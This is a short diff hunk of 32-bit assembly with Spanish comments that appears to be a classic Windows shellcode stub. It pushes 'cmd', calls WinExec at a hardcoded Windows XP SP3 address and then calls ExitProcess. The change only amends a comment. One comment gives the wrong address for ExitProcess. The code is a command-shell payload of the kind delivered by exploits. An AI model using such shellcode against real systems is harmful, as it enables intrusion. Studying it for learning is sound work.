@@ -3,7 +3,7 @@ BITS 32                   ;especificamos que el code es 32bits
 jmp short cmd             ;"cmd" a la pila
  
 init:
-   mov edx,7C8623ADh      ; 7C8623ADh>>direccion de WinExec a edx
+   mov edx,7C8623ADh      ; 7C8623ADh>>direccion de WinExec a edx Windows XP SP3
    call edx               ; hacemos la llamada (recordemos que "cmd" esta en la pila)
    mov edx,7C81CAFAh      ; 7C8623ADh>>direccion de ExitProcess a edx
    call edx               ; salimos
